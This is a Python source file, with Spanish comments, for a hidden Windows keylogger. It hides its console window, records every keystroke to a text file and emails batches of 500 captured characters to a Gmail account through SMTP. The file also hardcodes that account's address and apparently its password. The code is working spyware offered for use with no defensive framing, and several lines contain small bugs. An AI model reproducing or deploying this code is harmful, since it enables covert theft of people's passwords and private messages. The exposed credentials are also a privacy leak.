#!/usr/bin/env python
# -*- coding: utf-8 -*-

import win32console
import win32gui
import pythoncom,pyHook
import time
import smtplib
import os
import sys

########################################################
# Configuración de Variables
########################################################

win = win32console.GetConsoleWindow()
win32gui.ShowWindow(win,0)

#crea el archivo .txt
f=open("c:\output.txt","w+")
f.close

#Variable que cuenta las tecas presionadas
count = 0

########################################################
# Funciones
########################################################

def send_email(message):

    try:

        # Datos
        fromaddr = 'oscarmateo1997@gmail.com'
        toaddrs = 'oscarmateo1997@gmail.com'
        username = 'oscarmateo1997@gmail.com'
        password = 'viviteamomucho'

        # Enviando el correo
        server = smtplib.SMTP('smtp.gmail.com:587')
        server.starttls()
        server.login(username,password)
        server.sendmail(fromaddr, toaddrs, message)
        server.quit()

    except:

        pass


def OnKeyboardEvent(event):

    global count
    count += 1
    #presiona CTRL+E para salir
    if event.Ascii==5:
        sys.exit(0)

    if event.Ascii !=0 or 8:
        #abre output.txt
        f=open('c:\output.txt','r+')
        buffer=f.read()
        f.close()

        if len(buffer)==1:
            send_email("(づ￣ ³￣)づ")

        elif  count == 500:
            #Envia los ultimos 500 caracteres
            capturado = buffer[-500:].replace("\n","
")
            send_email(capturado)
            count = 0

        #abre output.txt escribe y suma nuevas pulsaciones
        f=open('c:\output.txt','w')
        keylogs=chr(event.Ascii)

        #si se presiona ENTER
        if event.Ascii==13:
            keylogs='\n'

        #si se preciona ESPACIO
        if event.Ascii==32:
            keylogs=''

        buffer+=keylogs
        f.write(buffer)
        f.close()


# crea el objeto hook manager
hm = pyHook.HookManager()
hm.KeyDown = OnKeyboardEvent
# set the hook
hm.HookKeyboard()
# wait forever
pythoncom.PumpMessages()
